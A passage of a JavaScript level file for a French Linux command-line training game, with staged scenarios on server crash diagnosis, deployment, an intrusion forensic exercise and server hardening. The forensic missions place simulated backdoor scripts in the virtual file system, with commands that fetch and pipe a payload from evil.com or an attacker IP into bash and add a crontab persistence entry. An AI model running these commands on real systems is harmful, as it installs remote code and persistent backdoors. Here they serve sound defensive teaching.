// levels.js — Scénarios en plusieurs étapes liées

const CHAPTERS = [

  // ════════════════════════════════════════════════════════════
  {
    id: 1,
    title: "🔥 Scénario 1 — Le serveur est tombé",
    scenario: "Il est 3h du matin. Une alerte te réveille : le site est down. Tu te connectes en SSH. Tu sais pas ce qui s'est passé. À toi de trouver.",
    missions: [

      {
        id: 1,
        name: "Étape 1 — Voir ce qu'il y a",
        cmd: "ls",
        xp: 15,
        lesson: {
          title: "La commande <code>ls</code> — Lister les fichiers",
          intro: "Tu viens d'arriver sur le serveur. Tu sais pas ce qu'il y a. <code>ls</code> (list) c'est ta lampe torche — elle te montre tout ce qui est dans le dossier courant.",
          syntax: "ls [options] [chemin]",
          options: [
            { flag: "-l",  desc: "Format long : permissions, taille, date de modification" },
            { flag: "-a",  desc: "Affiche les fichiers cachés (ceux qui commencent par .)" },
            { flag: "-h",  desc: "Tailles lisibles : Ko, Mo, Go (à utiliser avec -l)" },
            { flag: "-la", desc: "Combinaison : long + cachés — la plus utilisée en pratique" },
          ],
          examples: [
            { cmd: "ls",         comment: "# liste simple du dossier courant" },
            { cmd: "ls -l",      comment: "# avec taille, date, permissions" },
            { cmd: "ls -la",     comment: "# tout afficher, y compris les cachés" },
            { cmd: "ls /var/log", comment: "# lister un autre dossier" },
          ],
          tip: "Sur un serveur inconnu, la première commande que tout admin tape c'est `ls -la`. Réflexe à avoir."
        },
        desc: "Tu viens de te connecter. Qu'est-ce qu'il y a sur ce serveur ? Explore le répertoire courant.",
        fs: {
          "app.js":      { type: "file", content: "// serveur node\nconst express = require('express');" },
          "package.json":{ type: "file", content: '{"name":"monapp","version":"1.0.0"}' },
          "logs":        { type: "dir" },
          "config.json": { type: "file", content: '{"port":3000,"db":"postgres://localhost/prod"}' },
          ".env":        { type: "file", content: "DB_PASSWORD=s3cr3t\nAPI_KEY=abc123" },
        },
        hint: "La commande pour lister les fichiers s'appelle ls",
        check: (out) => /app|package|logs|config/.test(out),
        explanation: "Tu vois qu'il y a un dossier <code>logs/</code> et un fichier <code>config.json</code>. C'est là qu'on va chercher ce qui s'est passé. <code>ls</code> c'est toujours le point de départ."
      },

      {
        id: 2,
        name: "Étape 2 — Entrer dans les logs",
        cmd: "cd",
        xp: 15,
        lesson: {
          title: "La commande <code>cd</code> — Naviguer",
          intro: "Tu as vu qu'il y a un dossier <code>logs/</code>. Pour y entrer, tu utilises <code>cd</code> (Change Directory). C'est comme double-cliquer sur un dossier, mais en ligne de commande.",
          syntax: "cd [chemin]",
          options: [
            { flag: "cd logs",   desc: "Entre dans le dossier logs (chemin relatif)" },
            { flag: "cd ..",     desc: "Remonte d'un niveau (dossier parent)" },
            { flag: "cd ~",      desc: "Retourne à ton dossier home" },
            { flag: "cd /var",   desc: "Va directement à /var (chemin absolu)" },
          ],
          examples: [
            { cmd: "cd logs",   comment: "# entre dans logs/" },
            { cmd: "cd ..",     comment: "# remonte d'un niveau" },
            { cmd: "cd ~",      comment: "# retour au home" },
          ],
          tip: "Après un `cd`, tape toujours `ls` pour voir ce qu'il y a dans le nouveau dossier. C'est le réflexe cd → ls."
        },
        desc: "Tu as repéré le dossier <code>logs/</code> à l'étape précédente. Entre dedans.",
        fs: {
          "logs": { type: "dir" },
          "app.js": { type: "file", content: "// app" },
        },
        hint: "cd suivi du nom du dossier",
        check: (out, s) => s.cwd === "logs",
        explanation: "Tu es maintenant dans le dossier <code>logs/</code>. Le réflexe naturel c'est : cd dans le dossier → ls pour voir ce qu'il contient. C'est exactement ce qu'on va faire."
      },

      {
        id: 3,
        name: "Étape 3 — Voir les logs",
        cmd: "ls -la",
        xp: 20,
        lesson: {
          title: "<code>ls -la</code> — Le format détaillé",
          intro: "Tu es dans le dossier logs/. Tu veux voir tous les fichiers, y compris les cachés, avec leur date de modification. C'est là que <code>ls -la</code> devient utile.",
          syntax: "ls -la",
          options: [
            { flag: "-l", desc: "Affiche les permissions, la taille, et la date" },
            { flag: "-a", desc: "Inclut les fichiers cachés (qui commencent par .)" },
          ],
          examples: [
            { cmd: "ls -la",      comment: "# tout afficher en format détaillé" },
            { cmd: "ls -lah",     comment: "# même chose mais tailles en Ko/Mo/Go" },
          ],
          tip: "La date de modification dans `ls -la` est précieuse : si un fichier a été modifié la nuit du crash, c'est un indice."
        },
        desc: "Tu es dans le dossier <code>logs/</code>. Liste tout ce qu'il contient en format détaillé pour voir les dates.",
        fs: {
          "access.log":  { type: "file", perms: "-rw-r--r--", content: "GET / 200\nGET /api 200\nGET / 200" },
          "error.log":   { type: "file", perms: "-rw-r--r--", content: "ERROR: DB connection timeout\nERROR: Cannot write to /tmp\nERROR: Segmentation fault — process crashed" },
          ".debug.log":  { type: "file", perms: "-rw-------", content: "debug info..." },
        },
        hint: "ls avec les options -la pour voir tout en détail",
        check: (out) => /error|access|rw/.test(out),
        explanation: "Tu vois deux fichiers : <code>access.log</code> (les requêtes HTTP) et <code>error.log</code> (les erreurs). Et un fichier caché <code>.debug.log</code>. Le fichier qui t'intéresse pour comprendre le crash, c'est <code>error.log</code>."
      },

      {
        id: 4,
        name: "Étape 4 — Lire le log d'erreurs",
        cmd: "cat",
        xp: 20,
        lesson: {
          title: "La commande <code>cat</code> — Lire un fichier",
          intro: "<code>cat</code> affiche le contenu d'un fichier dans le terminal. C'est la façon la plus directe de lire un fichier sans ouvrir d'éditeur.",
          syntax: "cat [fichier]",
          options: [
            { flag: "-n", desc: "Affiche les numéros de ligne" },
          ],
          examples: [
            { cmd: "cat error.log",    comment: "# lire le fichier d'erreurs" },
            { cmd: "cat config.json",  comment: "# lire une config" },
            { cmd: "cat -n error.log", comment: "# avec numéros de ligne" },
          ],
          tip: "Pour les fichiers courts, `cat` est parfait. Pour les fichiers de milliers de lignes, utilise `less` à la place."
        },
        desc: "Tu as repéré <code>error.log</code>. Lis son contenu pour comprendre ce qui a fait planter le serveur.",
        fs: {
          "access.log": { type: "file", content: "GET / 200\nGET /api/users 200\nGET / 200" },
          "error.log":  { type: "file", content: "2024-01-15 03:00:01 ERROR DB connection timeout after 30s\n2024-01-15 03:00:02 ERROR Cannot write to /tmp/cache — disk full\n2024-01-15 03:00:03 ERROR Segmentation fault — process crashed\n2024-01-15 03:00:04 INFO  Attempting restart...\n2024-01-15 03:00:10 ERROR Restart failed — disk still full" },
        },
        hint: "cat suivi du nom du fichier pour afficher son contenu",
        check: (out) => /disk full|timeout|crashed|segmentation/i.test(out),
        explanation: "Tu as trouvé la cause : <strong>le disque est plein</strong>. Le serveur n'arrivait plus à écrire dans /tmp/cache, puis a crashé. Maintenant tu sais quoi corriger. C'est exactement comme ça que ça se passe en vrai : ls → cd → cat → diagnostic."
      },

      {
        id: 5,
        name: "Étape 5 — Compter les erreurs",
        cmd: "grep",
        xp: 25,
        lesson: {
          title: "La commande <code>grep</code> — Filtrer",
          intro: "Tu sais que le log contient des erreurs, mais tu veux juste les lignes ERROR. <code>grep</code> filtre un fichier et n'affiche que les lignes qui contiennent le motif cherché.",
          syntax: "grep motif fichier",
          options: [
            { flag: "-i",  desc: "Insensible à la casse : ERROR = error = Error" },
            { flag: "-n",  desc: "Affiche le numéro de ligne" },
            { flag: "-c",  desc: "Compte le nombre de lignes correspondantes" },
            { flag: "-v",  desc: "Inverse : lignes qui NE contiennent PAS le motif" },
          ],
          examples: [
            { cmd: "grep ERROR error.log",    comment: "# toutes les lignes avec ERROR" },
            { cmd: "grep -i error error.log", comment: "# ERROR, Error, error..." },
            { cmd: "grep -c ERROR error.log", comment: "# combien de lignes avec ERROR ?" },
          ],
          tip: "En production, `grep ERROR /var/log/app.log` est souvent la première commande qu'on tape quand quelque chose plante."
        },
        desc: "Tu veux isoler uniquement les lignes d'erreur dans <code>error.log</code>. Filtre-les avec grep.",
        fs: {
          "error.log": { type: "file", content: "2024-01-15 03:00:01 ERROR DB connection timeout after 30s\n2024-01-15 03:00:02 ERROR Cannot write to /tmp/cache — disk full\n2024-01-15 03:00:03 ERROR Segmentation fault — process crashed\n2024-01-15 03:00:04 INFO  Attempting restart...\n2024-01-15 03:00:10 ERROR Restart failed — disk still full" },
        },
        hint: "grep ERROR suivi du nom du fichier",
        check: (out) => /timeout|disk|crashed|restart/i.test(out) && !/attempting/i.test(out),
        explanation: "Tu as filtré uniquement les lignes ERROR — les lignes INFO ont disparu. Tu vois clairement les 4 erreurs. C'est beaucoup plus lisible que de lire tout le fichier. Sur un log de 100 000 lignes, grep te sauve la vie."
      },

      {
        id: 6,
        name: "Étape 6 — Combien d'erreurs ?",
        cmd: "grep | wc -l",
        xp: 30,
        lesson: {
          title: "Combiner grep et <code>wc -l</code> avec un pipe",
          intro: "Le pipe <code>|</code> connecte deux commandes : la sortie de la première devient l'entrée de la deuxième. C'est le concept le plus puissant du terminal.",
          syntax: "commande1 | commande2",
          options: [
            { flag: "wc -l", desc: "Compte le nombre de lignes reçues" },
            { flag: "wc -w", desc: "Compte le nombre de mots" },
          ],
          examples: [
            { cmd: "grep ERROR error.log | wc -l",  comment: "# combien d'erreurs ?" },
            { cmd: "ls | wc -l",                     comment: "# combien de fichiers ?" },
            { cmd: "cat log | grep ERROR | wc -l",  comment: "# chaîne de 3 commandes" },
          ],
          tip: "Le combo `grep | wc -l` est classique. Tu peux chaîner autant de pipes que tu veux."
        },
        desc: "Ton chef te demande : combien d'erreurs exactement depuis ce matin ? Utilise grep et wc ensemble.",
        fs: {
          "error.log": { type: "file", content: "2024-01-15 03:00:01 ERROR DB connection timeout after 30s\n2024-01-15 03:00:02 ERROR Cannot write to /tmp/cache — disk full\n2024-01-15 03:00:03 ERROR Segmentation fault — process crashed\n2024-01-15 03:00:04 INFO  Attempting restart...\n2024-01-15 03:00:10 ERROR Restart failed — disk still full" },
        },
        hint: "grep ERROR error.log | wc -l — connecte grep et wc avec le pipe |",
        check: (out) => /4/.test(out),
        explanation: "4 erreurs. Tu peux maintenant répondre précisément à ton chef. Le pipe a connecté grep (qui filtre) et wc -l (qui compte). Chaque commande fait une seule chose, mais ensemble elles sont puissantes."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 2,
    title: "📦 Scénario 2 — Préparer un déploiement",
    scenario: "Tu dois déployer une nouvelle version de l'application. Ça implique de créer des dossiers, sauvegarder l'existant, et préparer les fichiers de config.",
    missions: [

      {
        id: 7,
        name: "Étape 1 — Créer la structure",
        cmd: "mkdir",
        xp: 20,
        lesson: {
          title: "La commande <code>mkdir</code> — Créer des dossiers",
          intro: "<code>mkdir</code> crée un nouveau dossier. Simple, mais indispensable pour organiser un projet.",
          syntax: "mkdir [options] nom",
          options: [
            { flag: "-p", desc: "Crée les dossiers parents manquants en une seule commande" },
          ],
          examples: [
            { cmd: "mkdir backup",         comment: "# crée un dossier backup" },
            { cmd: "mkdir -p v2/src/lib",  comment: "# crée toute l'arborescence" },
            { cmd: "mkdir logs tmp cache", comment: "# plusieurs dossiers d'un coup" },
          ],
          tip: "L'option `-p` est très pratique : `mkdir -p a/b/c` crée a/, puis a/b/, puis a/b/c/ en une seule commande."
        },
        desc: "Avant de déployer, tu as besoin d'un dossier <code>backup</code> pour sauvegarder l'ancienne version. Crée-le.",
        fs: {
          "app.js":      { type: "file", content: "// v1 de l'app" },
          "config.json": { type: "file", content: '{"version":"1.0.0"}' },
        },
        hint: "mkdir suivi du nom du dossier à créer",
        check: (out, s) => s.mkdir === "backup",
        explanation: "Le dossier <code>backup/</code> est créé. Maintenant tu peux y copier l'ancienne version avant de déployer la nouvelle. C'est la bonne pratique : toujours sauvegarder avant de modifier."
      },

      {
        id: 8,
        name: "Étape 2 — Sauvegarder la config",
        cmd: "cp",
        xp: 20,
        lesson: {
          title: "La commande <code>cp</code> — Copier",
          intro: "<code>cp</code> copie un fichier. La source reste intacte, une copie est créée à la destination.",
          syntax: "cp source destination",
          options: [
            { flag: "-r",  desc: "Copie récursive — obligatoire pour copier un dossier entier" },
            { flag: "-v",  desc: "Verbeux : affiche chaque fichier copié" },
          ],
          examples: [
            { cmd: "cp config.json backup/config.json",  comment: "# copie dans le dossier backup" },
            { cmd: "cp config.json config.backup",       comment: "# copie avec nouveau nom" },
            { cmd: "cp -r dossier/ copie/",              comment: "# copier tout un dossier" },
          ],
          tip: "Avant de modifier un fichier de config en production, TOUJOURS en faire une copie. Si ça plante, tu peux restaurer."
        },
        desc: "Copie <code>config.json</code> dans le dossier <code>backup/</code> avant de le modifier.",
        fs: {
          "config.json": { type: "file", content: '{"version":"1.0.0","port":3000}' },
          "backup":      { type: "dir" },
        },
        hint: "cp prend la source et la destination : cp config.json backup/",
        check: (out, s) => s.cp && (s.cp.includes('backup')),
        explanation: "La config est sauvegardée dans <code>backup/</code>. Si le déploiement plante, tu peux restaurer avec <code>cp backup/config.json config.json</code>. C'est le filet de sécurité."
      },

      {
        id: 9,
        name: "Étape 3 — Mettre à jour la config",
        cmd: "echo >",
        xp: 25,
        lesson: {
          title: "<code>echo</code> et la redirection <code>&gt;</code>",
          intro: "<code>echo</code> affiche du texte. Combiné avec <code>&gt;</code>, il écrit ce texte dans un fichier. C'est la façon la plus rapide d'écrire dans un fichier depuis le terminal.",
          syntax: 'echo "texte" > fichier',
          options: [
            { flag: ">",  desc: "Redirige vers un fichier. ÉCRASE le contenu existant." },
            { flag: ">>", desc: "Ajoute à la fin du fichier sans écraser." },
          ],
          examples: [
            { cmd: 'echo "NODE_ENV=production" > .env',     comment: "# crée/écrase .env" },
            { cmd: 'echo "PORT=8080" >> .env',              comment: "# ajoute une ligne à .env" },
            { cmd: 'echo "v2.0.0" > VERSION',               comment: "# écrit la version" },
          ],
          tip: "Attention à la différence : `>` écrase tout, `>>` ajoute. Une erreur et tu perds le contenu du fichier !"
        },
        desc: 'Mets à jour le fichier <code>VERSION</code> pour indiquer que c\'est la version <code>2.0.0</code>.',
        fs: {
          "VERSION":     { type: "file", content: "1.0.0" },
          "config.json": { type: "file", content: '{"version":"1.0.0"}' },
          "backup":      { type: "dir" },
        },
        hint: 'echo "2.0.0" > VERSION',
        check: (out, s) => s.redirect === "VERSION",
        explanation: "Tu as écrasé le fichier VERSION avec la nouvelle valeur. Le <code>&gt;</code> redirige la sortie de echo vers le fichier au lieu de l'afficher dans le terminal. Simple et rapide."
      },

      {
        id: 10,
        name: "Étape 4 — Renommer l'ancienne version",
        cmd: "mv",
        xp: 25,
        lesson: {
          title: "La commande <code>mv</code> — Déplacer / Renommer",
          intro: "<code>mv</code> sert à deux choses : renommer un fichier, ou le déplacer dans un autre dossier. C'est la même commande pour les deux.",
          syntax: "mv source destination",
          options: [
            { flag: "-v", desc: "Affiche ce qui est déplacé/renommé" },
          ],
          examples: [
            { cmd: "mv app.js app.old.js",      comment: "# renomme le fichier" },
            { cmd: "mv app.js backup/app.js",   comment: "# déplace dans backup/" },
            { cmd: "mv *.log logs/",            comment: "# déplace tous les .log" },
          ],
          tip: "Contrairement à `cp`, `mv` supprime l'original. Le fichier est déplacé/renommé, pas copié."
        },
        desc: "Renomme <code>app.js</code> en <code>app.v1.js</code> pour garder une trace de l'ancienne version.",
        fs: {
          "app.js":  { type: "file", content: "// version 1" },
          "backup":  { type: "dir" },
          "VERSION": { type: "file", content: "2.0.0" },
        },
        hint: "mv suivi de l'ancien nom et du nouveau nom",
        check: (out, s) => s.mv === "app.v1.js",
        explanation: "L'ancien <code>app.js</code> est maintenant <code>app.v1.js</code>. Tu peux maintenant déployer la v2 sans perdre la v1. Si la v2 plante, tu as encore la v1 sous la main."
      },

      {
        id: 11,
        name: "Étape 5 — Nettoyer les vieux logs",
        cmd: "rm",
        xp: 20,
        lesson: {
          title: "La commande <code>rm</code> — Supprimer ⚠️",
          intro: "<code>rm</code> supprime des fichiers définitivement. Pas de corbeille sous Linux. Ce qui est supprimé est perdu.",
          syntax: "rm [options] fichier",
          options: [
            { flag: "-r",  desc: "Supprime un dossier et tout son contenu (récursif)" },
            { flag: "-i",  desc: "Demande confirmation avant chaque suppression" },
            { flag: "-f",  desc: "Force sans confirmation" },
          ],
          examples: [
            { cmd: "rm temp.log",      comment: "# supprime un fichier" },
            { cmd: "rm -r tmp/",       comment: "# supprime un dossier entier" },
            { cmd: "rm -i *.log",      comment: "# avec confirmation" },
          ],
          tip: "⚠️ Toujours vérifier deux fois avant de taper rm. Il n'y a pas d'annulation possible."
        },
        desc: "Le fichier <code>debug.log</code> est vieux et prend de la place. Supprime-le.",
        fs: {
          "debug.log":  { type: "file", content: "vieux logs de debug..." },
          "app.v1.js":  { type: "file", content: "// v1" },
          "backup":     { type: "dir" },
          "VERSION":    { type: "file", content: "2.0.0" },
        },
        hint: "rm suivi du nom du fichier à supprimer",
        check: (out, s) => s.rm === "debug.log",
        explanation: "Fichier supprimé définitivement. En production, on nettoie régulièrement les vieux logs pour éviter que le disque soit plein — exactement le problème qu'on a diagnostiqué au scénario 1."
      },

      {
        id: 12,
        name: "Étape 6 — Archiver le backup",
        cmd: "tar",
        xp: 35,
        lesson: {
          title: "La commande <code>tar</code> — Archiver",
          intro: "<code>tar</code> compresse un dossier entier en un seul fichier archive. C'est l'outil standard pour les sauvegardes sous Linux.",
          syntax: "tar -czf archive.tar.gz dossier/",
          options: [
            { flag: "-c", desc: "Créer une archive" },
            { flag: "-x", desc: "Extraire une archive" },
            { flag: "-z", desc: "Compresser avec gzip" },
            { flag: "-f", desc: "Spécifier le nom du fichier archive" },
          ],
          examples: [
            { cmd: "tar -czf backup.tar.gz backup/",  comment: "# compresse le dossier backup/" },
            { cmd: "tar -xzf backup.tar.gz",          comment: "# extrait l'archive" },
            { cmd: "tar -tzf backup.tar.gz",          comment: "# liste le contenu sans extraire" },
          ],
          tip: "Mémorise : `-czf` pour créer, `-xzf` pour extraire. Le `z` c'est pour gzip (compression)."
        },
        desc: "Archive le dossier <code>backup/</code> en un fichier <code>backup.tar.gz</code> pour le stocker proprement.",
        fs: {
          "backup":    { type: "dir" },
          "app.v1.js": { type: "file", content: "// v1" },
          "VERSION":   { type: "file", content: "2.0.0" },
        },
        hint: "tar -czf backup.tar.gz backup/",
        check: (out, s) => s.tar === "backup.tar.gz",
        explanation: "Tu as créé une archive compressée de ton backup. Elle peut maintenant être transférée sur un autre serveur ou stockée en sécurité. Le déploiement est prêt."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 3,
    title: "🔍 Scénario 3 — Enquête forensique",
    scenario: "Quelqu'un a accédé au serveur sans autorisation. Tu dois analyser les logs, retrouver l'intrus, et comprendre ce qu'il a fait.",
    missions: [

      {
        id: 13,
        name: "Étape 1 — Chercher les connexions suspectes",
        cmd: "grep -i",
        xp: 30,
        lesson: {
          title: "<code>grep -i</code> — Recherche insensible à la casse",
          intro: "<code>grep</code> cherche un motif dans un fichier et affiche les lignes correspondantes. L'option <code>-i</code> ignore la différence majuscules/minuscules.",
          syntax: "grep -i motif fichier",
          options: [
            { flag: "-i",  desc: "Insensible à la casse : FAILED = failed = Failed" },
            { flag: "-n",  desc: "Affiche le numéro de ligne" },
            { flag: "-r",  desc: "Cherche dans tous les fichiers d'un dossier" },
            { flag: "-v",  desc: "Inverse : lignes qui NE contiennent PAS le motif" },
          ],
          examples: [
            { cmd: "grep -i failed auth.log",    comment: "# toutes les tentatives échouées" },
            { cmd: "grep -i 'invalid user' auth.log", comment: "# utilisateurs invalides" },
            { cmd: "grep -n ERROR app.log",      comment: "# erreurs avec numéros de ligne" },
          ],
          tip: "Les logs d'authentification sont dans `/var/log/auth.log` sur un vrai serveur Linux. C'est la première chose qu'on regarde en cas d'intrusion."
        },
        desc: "Il y a un fichier <code>auth.log</code>. Cherche toutes les tentatives de connexion échouées (le mot <code>failed</code>).",
        fs: {
          "auth.log": { type: "file", content: "Jan 15 02:00:01 sshd: Accepted password for admin from 192.168.1.1\nJan 15 03:00:01 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:02 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:03 sshd: Failed password for admin from 45.33.32.156\nJan 15 03:00:04 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:05 sshd: Accepted password for root from 45.33.32.156\nJan 15 03:00:06 sshd: session opened for root from 45.33.32.156" },
        },
        hint: "grep -i failed auth.log",
        check: (out) => /45\.33|failed/i.test(out),
        explanation: "Tu vois 4 tentatives échouées depuis <code>45.33.32.156</code>, puis une réussie. C'est une attaque par force brute : l'attaquant a essayé des mots de passe en boucle jusqu'à trouver le bon. Et il a réussi."
      },

      {
        id: 14,
        name: "Étape 2 — Identifier l'IP suspecte",
        cmd: "grep | sort",
        xp: 30,
        lesson: {
          title: "La commande <code>sort</code> — Trier",
          intro: "<code>sort</code> trie les lignes alphabétiquement ou numériquement. Combiné avec un pipe, tu peux trier les résultats de n'importe quelle commande.",
          syntax: "sort [options] [fichier]",
          options: [
            { flag: "-r",  desc: "Tri inversé (Z→A, grand→petit)" },
            { flag: "-n",  desc: "Tri numérique (sinon 10 vient avant 2)" },
            { flag: "-u",  desc: "Supprime les doublons" },
          ],
          examples: [
            { cmd: "sort fichier.txt",             comment: "# tri alphabétique" },
            { cmd: "cat log | grep IP | sort",     comment: "# trier des IPs" },
            { cmd: "sort -u ips.txt",              comment: "# IPs uniques seulement" },
          ],
          tip: "Le combo `grep | sort | uniq -c | sort -rn` est classique pour compter et trier des occurrences dans un log."
        },
        desc: "Extrais toutes les IPs du fichier <code>auth.log</code> en cherchant 'from' et trie-les pour repérer les doublons.",
        fs: {
          "auth.log": { type: "file", content: "Jan 15 02:00:01 sshd: Accepted password for admin from 192.168.1.1\nJan 15 03:00:01 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:02 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:03 sshd: Failed password for admin from 45.33.32.156\nJan 15 03:00:04 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:05 sshd: Accepted password for root from 45.33.32.156\nJan 15 03:00:06 sshd: session opened for root from 45.33.32.156" },
        },
        hint: "grep 'from' auth.log | sort",
        check: (out) => /45\.33/.test(out) && /sort/i.test("grep from auth.log | sort"),
        explanation: "En triant, tu vois clairement que <code>45.33.32.156</code> apparaît 5 fois, contre 1 seule fois pour <code>192.168.1.1</code>. L'IP suspecte est identifiée."
      },

      {
        id: 15,
        name: "Étape 3 — Compter les tentatives",
        cmd: "grep | wc -l",
        xp: 30,
        lesson: {
          title: "<code>wc -l</code> — Compter les lignes",
          intro: "<code>wc -l</code> compte le nombre de lignes. Avec un pipe depuis grep, tu comptes exactement combien de fois quelque chose apparaît dans un fichier.",
          syntax: "grep motif fichier | wc -l",
          options: [
            { flag: "-l", desc: "Compte les lignes" },
            { flag: "-w", desc: "Compte les mots" },
            { flag: "-c", desc: "Compte les caractères" },
          ],
          examples: [
            { cmd: "grep Failed auth.log | wc -l",  comment: "# combien de tentatives échouées ?" },
            { cmd: "ls | wc -l",                     comment: "# combien de fichiers ?" },
          ],
          tip: "Ce combo est utilisé quotidiennement par les sysadmins et les analystes sécurité."
        },
        desc: "Ton rapport de sécurité doit indiquer le nombre exact de tentatives échouées depuis l'IP suspecte. Compte-les.",
        fs: {
          "auth.log": { type: "file", content: "Jan 15 02:00:01 sshd: Accepted password for admin from 192.168.1.1\nJan 15 03:00:01 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:02 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:03 sshd: Failed password for admin from 45.33.32.156\nJan 15 03:00:04 sshd: Failed password for root from 45.33.32.156\nJan 15 03:00:05 sshd: Accepted password for root from 45.33.32.156\nJan 15 03:00:06 sshd: session opened for root from 45.33.32.156" },
        },
        hint: "grep Failed auth.log | wc -l",
        check: (out) => /4/.test(out),
        explanation: "4 tentatives échouées, puis 1 réussie. L'attaquant a trouvé le mot de passe au 5ème essai. Ce type d'attaque s'appelle une attaque par force brute. En vrai, tu bloquerais l'IP avec <code>iptables</code> ou <code>fail2ban</code>."
      },

      {
        id: 16,
        name: "Étape 4 — Trouver les fichiers modifiés",
        cmd: "find",
        xp: 35,
        lesson: {
          title: "La commande <code>find</code> — Trouver des fichiers",
          intro: "<code>find</code> cherche des fichiers selon des critères : nom, extension, date de modification, taille... C'est beaucoup plus puissant que de chercher à la main.",
          syntax: "find [chemin] [critères]",
          options: [
            { flag: "-name '*.sh'",  desc: "Cherche par nom ou extension" },
            { flag: "-mtime -1",     desc: "Modifié il y a moins de 24h" },
            { flag: "-type f",       desc: "Seulement les fichiers (pas les dossiers)" },
            { flag: "-type d",       desc: "Seulement les dossiers" },
          ],
          examples: [
            { cmd: "find . -name '*.sh'",        comment: "# tous les scripts shell" },
            { cmd: "find . -name '*.log'",       comment: "# tous les fichiers log" },
            { cmd: "find /etc -name 'config*'",  comment: "# fichiers de config dans /etc" },
          ],
          tip: "Le `.` signifie 'le dossier courant et tous ses sous-dossiers'. C'est un point de départ classique."
        },
        desc: "L'intrus a peut-être laissé des scripts. Trouve tous les fichiers <code>.sh</code> sur le serveur.",
        fs: {
          "app.js":         { type: "file", content: "// app normale" },
          "start.sh":       { type: "file", content: "#!/bin/bash\nnode app.js" },
          "malware.sh":     { type: "file", content: "#!/bin/bash\ncurl http://evil.com/payload | bash" },
          "auth.log":       { type: "file", content: "logs..." },
          "readme.txt":     { type: "file", content: "readme" },
        },
        hint: "find . -name '*.sh' pour trouver tous les scripts shell",
        check: (out) => /malware\.sh|start\.sh/.test(out),
        explanation: "Tu as trouvé deux fichiers .sh : <code>start.sh</code> (normal) et <code>malware.sh</code> (suspect). L'intrus a laissé un script malveillant. Tu peux lire son contenu avec <code>cat malware.sh</code> pour voir ce qu'il fait."
      },

      {
        id: 17,
        name: "Étape 5 — Lire le script suspect",
        cmd: "cat",
        xp: 20,
        lesson: {
          title: "Analyser un fichier suspect avec <code>cat</code>",
          intro: "Tu as trouvé un fichier suspect. Avant de le supprimer, tu dois comprendre ce qu'il fait. <code>cat</code> te permet de lire son contenu sans l'exécuter.",
          syntax: "cat fichier",
          options: [
            { flag: "-n", desc: "Affiche les numéros de ligne — utile pour les scripts" },
          ],
          examples: [
            { cmd: "cat malware.sh",     comment: "# lire le script suspect" },
            { cmd: "cat -n malware.sh",  comment: "# avec numéros de ligne" },
          ],
          tip: "Ne JAMAIS exécuter un script suspect. Toujours le lire d'abord avec `cat`."
        },
        desc: "Lis le contenu de <code>malware.sh</code> pour comprendre ce que l'intrus voulait faire.",
        fs: {
          "malware.sh": { type: "file", content: "#!/bin/bash\n# Script installé par attaquant\ncurl http://45.33.32.156/payload.sh | bash\ncrontab -l | { cat; echo '*/5 * * * * /tmp/.hidden'; } | crontab -" },
          "start.sh":   { type: "file", content: "#!/bin/bash\nnode app.js" },
        },
        hint: "cat malware.sh pour lire le contenu du fichier",
        check: (out) => /curl|crontab|payload|hidden/i.test(out),
        explanation: "Le script télécharge un payload depuis le serveur de l'attaquant et l'installe dans crontab pour s'exécuter toutes les 5 minutes. C'est une backdoor classique. Prochaine étape : supprimer ce script et vérifier le crontab."
      },

      {
        id: 18,
        name: "Étape 6 — Supprimer la backdoor",
        cmd: "rm",
        xp: 25,
        lesson: {
          title: "Supprimer un fichier malveillant avec <code>rm</code>",
          intro: "Tu as identifié le fichier malveillant. Tu sais ce qu'il fait. Il est temps de le supprimer. <code>rm</code> supprime définitivement — pas de corbeille.",
          syntax: "rm fichier",
          options: [
            { flag: "-i", desc: "Demande confirmation avant de supprimer" },
          ],
          examples: [
            { cmd: "rm malware.sh",    comment: "# supprime le script malveillant" },
            { cmd: "rm -i *.sh",       comment: "# supprime les .sh avec confirmation" },
          ],
          tip: "En sécurité, avant de supprimer, fais toujours une copie du fichier malveillant dans un endroit sécurisé pour analyse. Ici on simplifie."
        },
        desc: "Supprime le fichier <code>malware.sh</code> pour éliminer la backdoor.",
        fs: {
          "malware.sh": { type: "file", content: "#!/bin/bash\ncurl http://evil.com/payload | bash" },
          "start.sh":   { type: "file", content: "#!/bin/bash\nnode app.js" },
          "auth.log":   { type: "file", content: "logs..." },
        },
        hint: "rm suivi du nom du fichier malveillant",
        check: (out, s) => s.rm === "malware.sh",
        explanation: "Backdoor supprimée. Tu as mené une vraie investigation forensique : analyse des logs, identification de l'attaquant, découverte du malware, nettoyage. C'est exactement ce que font les analystes en sécurité."
      }
    ]
  },

  // ════════════════════════════════════════════════════════════
  {
    id: 4,
    title: "🔐 Scénario 4 — Sécuriser le serveur",
    scenario: "Suite à l'intrusion, tu dois sécuriser le serveur : corriger les permissions, gérer les processus suspects, et verrouiller l'accès.",
    missions: [

      {
        id: 19,
        name: "Étape 1 — Auditer les permissions",
        cmd: "ls -l",
        xp: 30,
        lesson: {
          title: "Lire les permissions avec <code>ls -l</code>",
          intro: "Chaque fichier Linux a des permissions : qui peut le lire (r), l'écrire (w), l'exécuter (x). Il y a 3 niveaux : le propriétaire, le groupe, et les autres.",
          syntax: "ls -l",
          options: [],
          examples: [
            { cmd: "ls -l",           comment: "# voir les permissions de tout" },
            { cmd: "ls -l secret.key", comment: "# permissions d'un fichier précis" },
          ],
          tip: "Format : `-rwxrwxrwx` — propriétaire/groupe/autres. `r`=lire, `w`=écrire, `x`=exécuter, `-`=pas de droit."
        },
        desc: "Audite les permissions des fichiers sensibles du serveur. Lesquels sont trop permissifs ?",
        fs: {
          "app.js":     { type: "file", perms: "-rw-r--r--", content: "// app" },
          "deploy.sh":  { type: "file", perms: "-rwxrwxrwx", content: "#!/bin/bash" },
          "secret.key": { type: "file", perms: "-rw-rw-rw-", content: "PRIVATE KEY..." },
          "config.json":{ type: "file", perms: "-rw-r--r--", content: "{}" },
        },
        hint: "ls -l pour voir toutes les permissions",
        check: (out) => /rwxrwxrwx|rw-rw-rw/.test(out),
